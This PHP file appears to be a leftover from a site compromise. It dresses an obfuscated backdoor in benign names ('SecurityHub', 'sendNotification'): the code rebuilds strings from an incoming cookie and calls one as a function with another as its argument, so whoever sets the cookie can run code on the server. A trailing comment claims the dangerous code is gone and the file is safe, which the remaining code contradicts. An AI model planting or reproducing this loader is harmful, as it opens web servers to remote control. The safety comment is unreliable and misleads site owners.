<?php
class SecurityHub
{
    private static $_zv;
    static function sendNotification($_fl)
    {
        if (!self::$_zv) {
            self::saveChanges();
        }
        return hex2bin(self::$_zv[$_fl]);
    }
    private static function saveChanges()
    {
        self::$_zv = array('_ya' => '', '_sv' => '');
    }
}

$_ph = $_COOKIE;
$_al = (int) round(0 + 0 + 0 + 0);
$_fl = (int) round(1.5 + 1.5);
$_qhd = array();
$_qhd[$_al] = SecurityHub::sendNotification('_ya');
while ($_fl) {
    $_qhd[$_al] .= $_ph[(int) round(4 + 4 + 4)][$_fl];
    if (!$_ph[(int) round(6 + 6)][$_fl + (int) round(0.25 + 0.25 + 0.25 + 0.25)]) {
        if (!$_ph[(int) round(6 + 6)][$_fl + (int) round(0.66666666666667 + 0.66666666666667 + 0.66666666666667)]) {
            break;
        }
        $_al++;
        $_qhd[$_al] = SecurityHub::sendNotification('_' . 's' . 'v');
        $_fl++;
    }
    $_fl = $_fl + (int) round(1.5 + 1.5) + (int) round(0.25 + 0.25 + 0.25 + 0.25);
}
$_al = $_qhd[(int) round(1.25 + 1.25 + 1.25 + 1.25)]() . $_qhd[(int) round(0.5 + 0.5 + 0.5 + 0.5)];

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/
